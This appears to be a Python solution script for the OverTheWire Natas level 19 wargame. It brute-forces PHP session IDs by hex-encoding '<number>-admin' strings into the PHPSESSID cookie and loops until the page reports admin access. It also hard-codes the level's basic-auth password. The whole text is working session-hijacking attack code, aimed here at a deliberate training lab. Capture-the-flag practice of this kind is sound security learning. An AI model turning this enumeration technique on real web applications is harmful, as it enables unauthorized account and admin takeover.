import requests
from requests.auth import HTTPBasicAuth 


Auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(800):
    tmp = str(i) + '-admin'
    tmp = tmp.encode('hex')
    header = {"Cookie": "PHPSESSID={0}".format(tmp)} 
    print(header) 
    r = requests.post('http://natas19.natas.labs.overthewire.org/', auth=Auth, headers=header)

    if 'ou are an admi' in r.text:
        print (r.text)
        break
    else:
        print('fail')